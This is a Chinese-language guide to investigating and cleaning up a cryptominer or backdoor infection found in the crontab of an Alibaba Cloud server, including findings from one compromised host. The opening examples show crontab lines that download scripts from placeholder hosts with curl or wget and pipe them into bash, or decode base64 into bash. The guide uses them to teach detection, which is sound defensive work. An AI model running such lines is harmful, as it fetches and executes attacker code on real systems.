# 阿里云服务器入侵排查指南：crontab 可疑加密命令

## 一、背景说明

crontab 中出现 base64 加密命令、下载并执行远程脚本等行为，是**典型的挖矿病毒 / 木马入侵特征**。常见形式如：

```bash
# 典型挖矿病毒 crontab 示例
*/5 * * * * curl -fsSL http://malicious-site.com/setup.sh | bash
*/10 * * * * (curl -fsSL http://xxx.xxx/a.sh||wget -q -O- http://xxx.xxx/a.sh)|bash
* * * * * /tmp/.hidden/xmrig -o pool.minexmr.com:443 -u WALLET
0 */1 * * * echo "BASE64加密内容" | base64 -d | bash
```

> **是否被入侵？** 如果你在 crontab 中看到了 base64 编码、curl/wget 下载远程脚本、或者看不懂的二进制路径，**大概率已经被入侵**。

---

## 二、完整排查步骤

### 2.1 检查所有用户的 crontab

```bash
# 查看当前用户的 crontab
crontab -l

# 查看 root 用户的 crontab
sudo crontab -l

# 遍历所有用户的 crontab
for user in $(cut -f1 -d: /etc/passwd); do
  crontab_output=$(crontab -u "$user" -l 2>/dev/null)
  if [ -n "$crontab_output" ]; then
    echo "=== $user ==="
    echo "$crontab_output"
  fi
done
```

### 2.2 检查系统级 cron 配置

```bash
# 检查系统 crontab
cat /etc/crontab

# 检查 cron 子目录
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 查看每个文件的内容
for f in /etc/cron.d/*; do
  echo "--- $f ---"
  cat "$f"
done

# 检查 cron spool（有些病毒藏在这里）
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/
```

### 2.3 解码可疑的 base64 内容

如果发现 crontab 中有 base64 加密内容，先解码看看是什么：

```bash
# 将加密内容复制出来解码（不要执行！）
echo "这里粘贴base64内容" | base64 -d

# 如果是多层加密，可能需要多次解码
echo "内容" | base64 -d | base64 -d
```

### 2.4 检查可疑进程

```bash
# 按 CPU 占用排序（挖矿病毒通常 CPU 占用极高）
ps aux --sort=-%cpu | head -20
top -bn1 | head -20

# 搜索常见挖矿进程名
ps aux | grep -iE 'xmrig|kworkerds|crypto|miner|kdevtmpfs|kinsing|xmr|monero|stratum|minergate|pool\.'

# 查看进程树，发现异常父子关系
pstree -ap

# 检查被删除但仍在运行的文件（常见隐藏手法）
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'
```

### 2.5 检查网络连接

```bash
# 查看所有监听端口
ss -tlnp
netstat -tlnp

# 查看所有对外连接（重点关注矿池端口如 3333, 4444, 5555, 8888, 14444, 45700 等）
ss -tnp | grep -E ':3333|:4444|:5555|:8888|:14444|:45700'

# 查看所有活跃连接
ss -tnp

# DNS 查询记录（部分病毒通过 DNS 通信）
cat /var/log/syslog | grep -i "dns" | tail -50
```

### 2.6 检查可疑文件

```bash
# 检查常见病毒藏匿路径
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/
ls -la /tmp/.* 2>/dev/null
ls -la /root/.* 2>/dev/null

# 查找 /tmp 下的可执行文件（正常情况不应有太多）
find /tmp -type f -executable
find /var/tmp -type f -executable
find /dev/shm -type f

# 查找最近 3 天内被修改的文件
find / -mtime -3 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -50

# 查找隐藏目录（以 . 开头）
find /tmp /var/tmp /dev/shm -name ".*" -type d 2>/dev/null
```

### 2.7 检查用户和 SSH

```bash
# 有 shell 的用户
grep -v '/nologin\|/false' /etc/passwd

# 检查 authorized_keys（是否被植入后门公钥）
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys

# 检查最近登录
last -20
lastb -20   # 失败的登录

# 检查 SSH 配置是否被篡改
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile'
```

### 2.8 检查系统服务和启动项

```bash
# 检查 systemd 定时器
systemctl list-timers --all

# 检查运行中的服务
systemctl list-units --type=service --state=running

# 检查最近修改的服务文件
find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -mtime -30

# 检查 rc.local
cat /etc/rc.local

# 检查 LD_PRELOAD 劫持（高级持久化手法）
echo $LD_PRELOAD
cat /etc/ld.so.preload

# 检查 profile 后门
tail -20 /etc/profile
tail -20 /etc/bash.bashrc
tail -20 /root/.bashrc
tail -20 /root/.bash_profile
```

### 2.9 检查日志

```bash
# 检查安全日志
cat /var/log/auth.log | grep -E 'Accepted|Failed' | tail -50

# 检查暴力破解痕迹
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# 检查 cron 执行日志
grep CRON /var/log/syslog | tail -50

# 检查内核日志
dmesg | grep -i error | tail -20
```

---

## 三、常见挖矿病毒特征

| 特征 | 说明 |
|------|------|
| crontab 中有 base64 编码命令 | `echo "xxx" \| base64 -d \| bash` |
| crontab 中有 curl/wget 下载并执行 | `curl http://xxx/a.sh \| bash` |
| CPU 长期占用 90%+ | 挖矿进程大量消耗 CPU |
| 进程名伪装成系统进程 | 如 `kworkerds`、`kdevtmpfsi`、`kinsing` |
| `/tmp`、`/var/tmp`、`/dev/shm` 下有可疑文件 | 病毒喜欢藏在临时目录 |
| 有到矿池 IP/域名的外连 | 如 `pool.minexmr.com`、`xmr.pool.minergate.com` |
| `authorized_keys` 中有陌生公钥 | 攻击者植入后门 |
| `LD_PRELOAD` 被设置 | 用于隐藏进程和文件 |
| 防火墙规则被修改 | `iptables` 规则异常 |

---

## 四、处置措施

### 4.1 紧急处置

```bash
# 1. 立即清除可疑 crontab
crontab -r           # 清除当前用户
sudo crontab -r      # 清除 root

# 2. 杀掉可疑进程
kill -9 <PID>

# 3. 删除可疑文件
rm -f /tmp/.hidden_malware
rm -f /var/tmp/.cache_file

# 4. 检查并清理 authorized_keys
vim /root/.ssh/authorized_keys
vim /home/ubuntu/.ssh/authorized_keys

# 5. 清理恶意 cron 文件
rm -f /etc/cron.d/malicious_job
```

### 4.2 加固措施

```bash
# 1. 修改所有用户密码（使用强密码）
passwd root
passwd ubuntu

# 2. 禁止 root SSH 登录
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd

# 3. 禁止密码登录，改为密钥登录
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# 4. 配置防火墙
# 阿里云安全组只开放必要端口（22、80、443）
# 本机防火墙
ufw enable
ufw default deny incoming
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp

# 5. 安装并配置 fail2ban（防暴力破解）
apt install fail2ban -y
systemctl enable fail2ban
systemctl start fail2ban

# 6. 更新系统
apt update && apt upgrade -y

# 7. 锁定 crontab，只允许特定用户
echo "root" > /etc/cron.allow
chmod 600 /etc/cron.allow
```

### 4.3 阿里云平台侧操作

1. **阿里云安全中心**：登录阿里云控制台 → 云安全中心 → 查看告警事件
2. **安全组**：检查并收紧安全组规则，移除不必要的入站规则
3. **AccessKey 检查**：在 RAM 控制台检查是否有异常的 AccessKey
4. **快照备份**：立即创建磁盘快照，保留取证证据
5. **云安全中心扫描**：使用阿里云安全中心的"病毒查杀"功能全盘扫描
6. **操作审计**：查看 ActionTrail 操作审计日志，排查异常 API 调用

---

## 五、预防建议

1. **修改 SSH 默认端口**（22 → 其他端口）
2. **禁用密码登录**，仅使用密钥认证
3. **开启阿里云安全中心**（免费版也有基础防护）
4. **定期检查 crontab 和系统服务**
5. **安装 HIDS**（主机入侵检测系统），如阿里云安骑士
6. **最小权限原则**：不使用 root 运行服务
7. **及时更新补丁**：定期执行 `apt update && apt upgrade`
8. **设置系统审计**：配置 auditd 监控关键文件变更

---

## 六、实际排查结果 — 服务器 iZhp391k3htvdhlorwlb2yZ

> **结论：该阿里云 ECS 服务器已被入侵，确认存在恶意后门程序。**

### 6.1 入侵证据汇总

| 检查项 | 发现 | 严重程度 |
|--------|------|----------|
| crontab 恶意任务 | `* * * * *` 每分钟执行 `/tmp/LdlQNdD4ST`，携带加密 payload | 🔴 **严重** |
| crontab 文件被锁定 | `lsattr` 显示 `i`（immutable）标志，阻止清除 | 🔴 **严重** |
| `/tmp` 下可疑二进制 | `/tmp/LdlQNdD4ST` 随机命名的可执行文件 | 🔴 **严重** |
| 加密 payload | 562 字节的自定义加密二进制数据（非标准 base64 文本），由恶意程序解密执行 | 🔴 **严重** |
| Redis 暴露 | Redis 监听 `*:6379`（所有网卡），无密码或弱密码可能是入侵入口 | 🟡 **高危** |
| 全量 root 运行 | 所有服务（Java/Nacos/Tomcat/MySQL/Nginx/Redis）均以 root 用户运行 | 🟡 **高危** |

### 6.2 详细分析

#### 证据 1：恶意 crontab 定时任务

```
* * * * * root /tmp/LdlQNdD4ST 9G56hkZO+d6ymLOwhqTK9V...（加密内容）...kt9BVw==
```

- **`* * * * *`**：每分钟执行一次
- **`/tmp/LdlQNdD4ST`**：`/tmp` 目录下的随机命名二进制文件，这是恶意程序的典型特征
- **后面的长字符串**：是自定义加密的 payload（562 字节的二进制数据），不是纯 base64 文本，说明恶意程序使用了自己的加解密算法，解密后很可能是矿池地址、钱包地址、C2 服务器地址等配置信息

#### 证据 2：crontab 文件被设置 immutable 标志

```
----i--------e-- /var/spool/cron/root
```

文件上的 `i` 标志（immutable）意味着：
- **即使 root 也无法直接修改或删除这个文件**
- 必须先用 `chattr -i` 移除标志才能操作
- 这是恶意软件的**经典持久化手段**，防止管理员通过 `crontab -r` 或 `crontab -e` 清除恶意任务

#### 证据 3：可能的入侵路径

根据服务列表分析，最可能的入侵路径是：

1. **Redis 未授权访问**（最可能）：Redis 监听在 `*:6379`，如果没有设置密码且未用防火墙限制，攻击者可通过 Redis 写入 crontab
2. **Tomcat/Java 漏洞**：运行的 Tomcat 9.0.86 和 Nacos，如果存在已知漏洞且未打补丁
3. **SSH 暴力破解**：root 直接 SSH 登录 + 弱密码
4. **Nacos 未授权访问**：Nacos 默认用户名密码 nacos/nacos 未修改

#### 进程分析

从 `ps aux` 和 `pstree` 输出来看：
- 进程列表中的 `kdevtmpfs`（PID 18）和 `crypto`（PID 39）是**正常的 Linux 内核线程**，不是恶意软件
- 当前 CPU 占用最高的是 Nacos（2.2%）和 AliYunDunMonitor（2.1%），未见明显的高 CPU 挖矿进程
- 恶意程序可能处于**休眠/等待状态**，或者采用了低 CPU 策略以避免被发现
- 也可能挖矿进程通过 LD_PRELOAD 或 rootkit 进行了**进程隐藏**

### 6.3 紧急处置步骤（按顺序执行）

> ⚠️ **重要：在操作前先创建磁盘快照，保留取证证据！**

```bash
# ========== 第一步：创建快照 ==========
# 登录阿里云控制台 → ECS → 磁盘 → 创建快照（保留证据）

# ========== 第二步：移除 crontab 的 immutable 标志并清除恶意任务 ==========
chattr -i /var/spool/cron/root
crontab -r
# 验证是否清除成功
crontab -l
# 确认 immutable 标志已移除
lsattr /var/spool/cron/root

# ========== 第三步：停止并删除恶意文件 ==========
# 查看恶意文件信息
ls -la /tmp/LdlQNdD4ST
file /tmp/LdlQNdD4ST
# 计算 hash 留存（用于威胁情报查询）
md5sum /tmp/LdlQNdD4ST
sha256sum /tmp/LdlQNdD4ST
# 删除恶意文件
rm -f /tmp/LdlQNdD4ST

# ========== 第四步：查找并杀掉可疑进程 ==========
# 查找 LdlQNdD4ST 相关进程
ps aux | grep LdlQNdD4ST
# 如果找到，杀掉
kill -9 <PID>

# 检查是否有被删除但仍在运行的文件
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'

# 检查隐藏的进程（使用 unhide 工具，如果未安装先安装）
yum install -y unhide 2>/dev/null
unhide proc 2>/dev/null

# ========== 第五步：检查是否还有其他后门 ==========
# 检查所有 /tmp、/var/tmp、/dev/shm 下的可执行文件
find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null

# 检查近期修改的文件
find / -mtime -7 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/var/log/*" 2>/dev/null | head -100

# 检查是否有其他被设置 immutable 标志的文件
lsattr /etc/cron.d/* 2>/dev/null
lsattr /etc/crontab 2>/dev/null

# 检查 authorized_keys
cat /root/.ssh/authorized_keys
lsattr /root/.ssh/authorized_keys 2>/dev/null

# 检查 LD_PRELOAD 和 /etc/ld.so.preload
echo $LD_PRELOAD
cat /etc/ld.so.preload 2>/dev/null
lsattr /etc/ld.so.preload 2>/dev/null

# 检查 systemd 中是否有恶意服务
systemctl list-units --type=service --state=running | grep -vE 'aegis|aliyun|sshd|crond|docker|firewall|network|systemd|rsyslog|polkit|auditd|dbus|tuned|chronyd'

# 检查 /root/.bashrc 和 /etc/profile 是否被篡改
tail -20 /root/.bashrc
tail -20 /etc/profile
tail -20 /etc/bashrc

# ========== 第六步：修复 Redis 安全问题 ==========
# Redis 未授权访问是最常见的入侵入口

# 方法1：设置 Redis 密码
redis-cli
> CONFIG SET requirepass "你的强密码"
> CONFIG REWRITE

# 方法2：让 Redis 只监听本地
# 编辑 /usr/local/redis-5.0.9/bin/redis.conf
# 修改 bind 127.0.0.1
# 重启 Redis

# 方法3：用防火墙限制 6379 端口
firewall-cmd --permanent --remove-port=6379/tcp
firewall-cmd --reload

# ========== 第七步：修改密码和加固 SSH ==========
passwd root

# 修改 SSH 端口
vi /etc/ssh/sshd_config
# Port 22 改为其他端口如 Port 62222
# PermitRootLogin yes 改为 PermitRootLogin prohibit-password
# PasswordAuthentication yes 改为 PasswordAuthentication no（确保密钥登录已配置好）
systemctl restart sshd

# ========== 第八步：修改 Nacos 密码 ==========
# 当前 Nacos 使用默认密码 nacos/nacos，必须修改
# 登录 Nacos 控制台修改密码

# ========== 第九步：检查阿里云安全组 ==========
# 登录阿里云控制台，确保安全组只开放必要端口
# 必须关闭：6379（Redis）、8848（Nacos）对外访问
# 保留：22/SSH（建议改端口）、80、443、业务必要端口

# ========== 第十步：全盘杀毒 ==========
# 使用阿里云安全中心进行全盘扫描
# 或安装 ClamAV
yum install -y clamav clamav-update
freshclam
clamscan -r /tmp /var/tmp /dev/shm /root /usr/local/bin --infected
```

### 6.4 后续深入排查命令

```bash
# 检查网络外连（查找矿池连接）
netstat -tnp | grep ESTABLISHED
ss -tnp | grep -v '127.0.0.1'

# 检查 auth 日志查看入侵时间和来源 IP
grep "Accepted" /var/log/secure | tail -50
grep "Failed" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# 检查 cron 日志确认恶意任务执行历史
grep CRON /var/log/cron | tail -50
grep LdlQNdD4ST /var/log/cron

# 检查 Redis 日志
cat /usr/local/redis-5.0.9/redis.log 2>/dev/null | tail -100

# 查看最近的登录 IP
last -20

# 查看 history 命令历史（攻击者可能清除了）
cat /root/.bash_history | tail -100

# 将恶意文件 hash 上传 VirusTotal 查询
# https://www.virustotal.com/
```

### 6.5 为什么 CPU 不高但仍确认是恶意软件？

1. **不是所有恶意软件都是挖矿程序**：可能是后门（反弹 shell）、僵尸网络客户端、DDoS 工具等
2. **智能挖矿**：部分挖矿程序会检测 CPU 使用率，在低负载时才挖矿，或限制 CPU 使用率（如只用 20-30%）以避免被发现
3. **间歇性执行**：每分钟启动一次可能只是检查心跳/下载更新，实际挖矿进程可能已被安全软件（AliYunDun）杀掉但 crontab 持续试图重启
4. **进程隐藏**：通过 rootkit 或 LD_PRELOAD 技术隐藏了真实进程

### 6.6 阿里云平台侧操作

1. **立即操作**：阿里云控制台 → 云安全中心 → 入侵检测 → 查看告警事件
2. **创建快照**：ECS 控制台 → 磁盘 → 创建快照
3. **收紧安全组**：关闭 6379（Redis）、8848（Nacos）、3306（MySQL）等端口的外网访问
4. **AccessKey 排查**：RAM 控制台检查是否有异常 AccessKey 泄露
5. **操作审计**：ActionTrail 查看异常 API 调用
6. **病毒查杀**：云安全中心 → 病毒查杀 → 全盘扫描
